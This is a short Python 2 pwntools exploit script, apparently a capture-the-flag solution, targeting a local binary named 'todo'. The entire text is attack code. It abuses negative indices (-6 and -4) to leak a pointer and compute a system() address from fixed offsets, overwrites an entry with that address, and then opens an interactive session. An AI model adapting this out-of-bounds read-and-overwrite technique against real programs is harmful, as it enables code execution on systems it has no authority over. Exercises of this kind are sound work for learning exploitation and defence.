#!/usr/bin/env python2
from pwn import *
from struct import unpack,pack
r = process("./todo")
r.send("hacker\n")
r.readuntil(">")
r.send("2\n")
r.readuntil("read?")
r.send("-6\n")
res = r.readuntil("Hi hacker,").splitlines()[0]
write_addr = res.split(':',1)[1][1:].ljust(8,chr(0))
print(write_addr.encode("hex"))
write_addr = unpack("<Q",write_addr)[0]
print(hex(write_addr))
base_addr = write_addr-0x910
system_addr = base_addr + 0x940
print hex(system_addr)
r.readuntil(">")
r.send("3\n")
r.readuntil("entry?")
r.send("-4\n")
r.send("A"*8+pack("<Q",system_addr)+"\n")
r.interactive()
